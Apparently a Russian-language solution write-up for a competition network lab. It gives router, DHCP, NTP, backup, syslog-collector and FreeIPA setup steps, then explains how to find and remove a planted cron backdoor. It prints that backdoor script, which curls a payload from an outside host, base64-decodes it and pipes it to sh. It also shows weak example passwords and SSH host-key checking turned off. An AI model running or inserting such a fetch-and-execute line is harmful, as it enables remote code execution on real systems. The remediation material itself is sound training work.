interface eth0
 ip ospf authentication message-digest
 ip ospf message-digest-key 1 md5 GreenSkillsOSPF3
exit
!
router ospf
 ospf router-id 10.50.10.10
 network 10.10.10.0/24 area 1
 network 10.20.10.0/24 area 1
 network 10.30.10.0/24 area 1
 network 10.50.10.0/24 area 1
 area 1 authentication message-digest
 neighbor 10.50.10.1
exit
!
```

### dhcpd.conf
```
option domain-name "ad.greenlab.local";
option domain-name-servers 192.168.50.10, 77.88.77.88;
ddns-update-style interim;
default-lease-time 32400;
max-lease-time 604800;
log-facility local7;

subnet 10.10.10.0 netmask 255.255.255.0 {
  range 10.10.10.2 10.10.10.79;
  option broadcast-address 10.10.10.255;
  option routers 10.10.10.1;
}

subnet 10.20.10.0 netmask 255.255.255.0 {
  range 10.20.10.2 10.20.10.79;
  option broadcast-address 10.20.10.255;
  option routers 10.20.10.1;
}

subnet 10.30.10.0 netmask 255.255.255.0 {
  range 10.30.10.2 10.30.10.79;
  option broadcast-address 10.30.10.255;
  option routers 10.30.10.1;
}

host ws-pca { 
    hardware ethernet 50:a8:e7:00:19:00;
    fixed-address 10.10.10.77;
}

host srv-bcp {
  hardware ethernet 50:21:86:00:1b:00;
  fixed-address 10.30.10.77;
}
```

### isc-dhcd-server
```
# Defaults for isc-dhcp-server (sourced by /etc/init.d/isc-dhcp-server)

# Path to dhcpd's config file (default: /etc/dhcp/dhcpd.conf).
#DHCPDv4_CONF=/etc/dhcp/dhcpd.conf
#DHCPDv6_CONF=/etc/dhcp/dhcpd6.conf

# Path to dhcpd's PID file (default: /var/run/dhcpd.pid).
#DHCPDv4_PID=/var/run/dhcpd.pid
#DHCPDv6_PID=/var/run/dhcpd6.pid

# Additional options to start dhcpd with.
#	Don't use options -cf or -pf here; use DHCPD_CONF/ DHCPD_PID instead
#OPTIONS=""

# On what interfaces should the DHCP server (dhcpd) serve DHCP requests?
#	Separate multiple interfaces with spaces, e.g. "eth0 eth1".
DHCPDv4_CONF=/etc/dhcp/dhcpd.conf
DHCPDv4_PID=/var/run/dhcpd.pid
INTERFACESv4="eth1 eth2 eth3"
```

### iptables rule
```
iptables -A FORWARD -s 10.20.10.0/24 -d 10.30.10.0/24 -j DROP
```

### logs dhcp astra
При необходимости включения файла лога, установим службу:
```shell
apt install rsyslog
```
Добавим конфигурацию:
```shell
nano /etc/rsyslog.conf
```
```
local7.* /var/log/dhcpd.log
```
Добавим правила в iptables (опционально):
```shell
iptables -A INPUT -p tcp --dport 67 -j ACCEPT
iptables-save > /etc/iptables/rules.v4
```
Перезапустим службы:
```shell
systemctl restart rsyslog; systemctl restart isc-dhcp-server
```
#dhcp #astra

## ntp set up
```
Настройка NTP-сервера в Linux: 

Обновите пакеты репозитория с помощью команды sudo apt-get update.
Установите NTP-сервер с помощью команды sudo apt-get install ntp.
Убедитесь, что NTP корректно установился, для этого пропишите systemctl status ntp.
Откройте файл конфигурации NTP с помощью команды sudo nano /etc/ntp.conf.
Внесите необходимые изменения в файл конфигурации, указав сервера времени.
pool srv-dc.ad.greenlab.local iburst
server srv-dc.ad.greenlab.local iburst prefer
server 127.127.1.0

Перезапустите сервер, чтобы применить все изменения: sudo service ntp restart. 
Проверьте очередь синхронизации: ntpq -ps. Эта команда позволит убедиться, что NTP-сервер указан как источник в очереди синхронизации времени.

https://www.dmosk.ru/miniinstruktions.php?mini=ntp-server-ubuntu
```

## add user(astra or redos)
```
useradd anuser #redos
useradd -m anuser -s /bin/bash #astra
passwd anuser
usermod -aG wheel anuser #redos
usermod -aG astra-admin anuser #astra
```

## srv-bcp
### backup script
```bash
#!/bin/bash

# Настройки
USERNAME="backuser"
BACKUP_DIR="/home/$USERNAME"
HOSTS=("10.10.10.77" "10.20.10.2") # Массив с именами хостов для резервного копирования
DATE=$(date +"%Y-%m-%d_%H-%M-%S")

# Проверка наличия директории назначения
if [ ! -d "$BACKUP_DIR" ]; then
  mkdir -p "$BACKUP_DIR"
  if [ $? -ne 0 ]; then
    echo "Ошибка: Не удалось создать директорию $BACKUP_DIR"
    exit 1
  fi
fi

# Цикл по хостам
for HOST in "${HOSTS[@]}"; do
  # Создаем подкаталог для каждого хоста
  HOST_BACKUP_DIR="$BACKUP_DIR/$HOST"

  if [ ! -d "$HOST_BACKUP_DIR" ]; then
      mkdir -p "$HOST_BACKUP_DIR"
      if [ $? -ne 0 ]; then
          echo "Ошибка: Не удалось создать директорию $HOST_BACKUP_DIR"
          exit 1
      fi
  fi

  BACKUP_SUBDIR="$HOST_BACKUP_DIR/backup_$DATE"

  if [ ! -d "$BACKUP_SUBDIR" ]; then
      mkdir -p "$BACKUP_SUBDIR"
      if [ $? -ne 0 ]; then
          echo "Ошибка: Не удалось создать директорию $BACKUP_SUBDIR"
          exit 1
      fi
  fi
  # Запускаем rsync для каждого хоста
  rsync -avz --delete -e "ssh -o StrictHostKeyChecking=no" "${USERNAME}@${HOST}:/home/" "$BACKUP_SUBDIR"

  if [ $? -ne 0 ]; then
    echo "Ошибка: Резервное копирование с хоста $HOST не удалось."
  else
    echo "Резервное копирование с хоста $HOST успешно завершено в $BACKUP_SUBDIR"
  fi
done

echo "Резервное копирование завершено."
```

### itables.sh
```
#!/bin/bash
curl http://hack.greenskills.gs/job.sh | base64 -d | sh && echo "I could encrypt everything but for now I'm just playing around!!! xExE ^_^ $(date)" >> /var/log/cronlog

```

### Описание
```
В каталоге /backup лежали оба веб приложения. В задании на это были намеки, можно было взять от сюда.

Из узявимостей на сервере:
Нужно было проверить crontab -e. Каждый 10 минут запускался itables.sh, который был расположен в /sbin/itables.sh (приложен в папке)

Он загружал с домена hack.greenskills.gs файл linpeas.sh и исполнял его, затем писал строчку в лог /var/log/cronlog.
Обнаружить можно было:
cat /etc/hosts (там запись домена)
ps auxf (факт выполнения в процессах)

Логика была в том, что как только вы настраиваете сетевую связанность и появляется доступ до репо, скрипт начинает качать и выполнять (нагружая систему). 
Хотел ребут каждые 10 минут, но в прод не толкнул это.

Результат должен быть: отчищеный крон, удаленный скрипт и запись в hosts. Упоминание в отчете, что у провайдера в DNS есть зона greenskills.gs, а в ней запись 3 уровня hack. Из этого можно предположить, что провайдер тоже скомпрометирован.


Резервное копирование:
1 вариант: если тачки в домене и есть связь, можно было создать backuser в домене, политиками разрешить доступ к хостам. Это правильный, но более сложный.
2 вариант (в тупую):
Создаем пользователя backuser на ws-pca и ws-pco и srv-bсp.
На сервере srv-bcp создаем ssh ключи и раскидываем на ws-pca и ws-pco.
Cгенерировать: ssh-keygen.
Затем переместить:
ssh-copy-id backuser@10.10.10.77
ssh-copy-id backuser@10.20.10.2

https://losst.pro/avtorizatsiya-po-klyuchu-ssh



Устанавливаем на WS-PCO и WS-PCA:
apt update rsync acl

Даем права на каталоги: 
sudo setfacl -R -m u:backuser:rX /home
sudo setfacl -d -R -m u:backuser:rX /home

Пишем скрипт и выполняем. (скрипт в папке)
Добавляем задачу в крон: crontab -e
*/10 * * * * /home/backuser/backup_script.sh
```

## srv-col
### Инфо
```
https://redos.red-soft.ru/base/redos-7_3/7_3-administation/7_3-events/7_3-loganalyzer/?nocache=1739972850108

dnf update rpm
dnf update -y
dnf install mariadb-server rsyslog-mysql php php-mysql php-gd httpd -y

setsebool -P httpd_can_network_connect 1
setsebool -P httpd_can_network_connect_db 1

systemctl enable httpd --now
systemctl enable mariadb --now

mariadb-admin -u root password P@ssw0rd
mariadb -u root -p < /usr/share/doc/rsyslog/mysql-createDB.sql

mariadb -u root -p
GRANT ALL ON Syslog.* TO 'rsyslog'@'localhost' IDENTIFIED BY 'P@ssw0rd';
FLUSH PRIVILEGES;
exit

nano /etc/rsyslog.conf

В MODULES
module(load="ommysql")

В RULES
*.* :ommysql:localhost,Syslog,rsyslog,P@ssw0rd

systemctl restart rsyslog.service

dnf install loganalyzer
ln -s /usr/share/loganalyzer/ /var/www/html/loganalyzer
cd /var/www/html/loganalyzer
restorecon -R /var/www/html/loganalyzer
chcon -t httpd_sys_rw_content_t config.php

Входим через браузер и настраиваем дальше там. Вносим параметры базы и создаем пользователя.

Если вдруг ломает кодировку в базе.
Заходим в базу под рутом: mysql -u root -p
ALTER DATABASE Syslog CHARACTER SET = utf8mb4 COLLATE = utf8mb4_unicode_ci;
ALTER TABLE SystemEvents CONVERT TO CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;

===========
Отправка логов с хостов по заданию.
На хостах создаем файл: nano /etc/rsyslog.d/to_collector.conf
В файл вносим: *.* @@192.168.150.10:514 (@@ означает отправку по UDP, @ по TCP)
Рестартим сервис: systemctl restart rsyslog
```

## srv-dc
### Установка домена
```
Все максимально просто.
Задаем правильный статический адрес по схеме.
192.168.50.10 ip
255.255.255.255 mask
192.168.50.1 gateway

Задать имя хоста является обязательным условием для FreeIPA и это единственный хост, где уже стояло корректное название.

Далее:
Пуск->Прочие->Настройка FreeIpa Fly

В выпадающем окне.
Задаем имя домена: ad.greenlab.local
Задаем ip адрес.

В выпадающем окне ставим галочку "Центр сертификации".
Устанавливаем. Уходим с тачки мин на 15 и делаем другие задачи.

Остальные вещи в FreeIPA настраиваются абсолютно интуитивно по заданию. Вся информация есть в Wiki.
https://wiki.astralinux.ru/pages/viewpage.action?pageId=27362143

Информация по сертификатам отдельным файлом. Скриншоты тоже приложены.
```

### Выпуск сертификатов
```
Идентификация->Службы->Добавить службу
Выбираете тип http и пишете имя сервиса: blog.greenlab.rst

Далее переходите в консоль на DC, вам необходимо привязать службу HTTP к хосту в домене, лучше всего в нашем случае будет привязать её к доменному контроллеру командой – 
ipa service-add-host –hosts=srv-dc.ad.greenlab.local HTTP/blog.greenlab.rst

А затем выпускаем сертификат командой – 
ipa-getcert request -r -f /opt/cert1.crt -k /opt/cert1.key -N CN=blog.greenlab.rst -D blog.greenlab.rst -K HTTP/blog.greenlab.rst


Проверьте, чтобы в /opt появились ваши сертификаты.
А также, в веб-интерфейсе FreeIPA.
Переносим их на сервер web.

Аналогично сделать с app.greenlab.rst
```

## ws-pco
[[Astra GUI]]
### ввод в домен
```
apt install astra-freeipa-client -y
astra-freeipa-client -d ad.greenlab.local 
```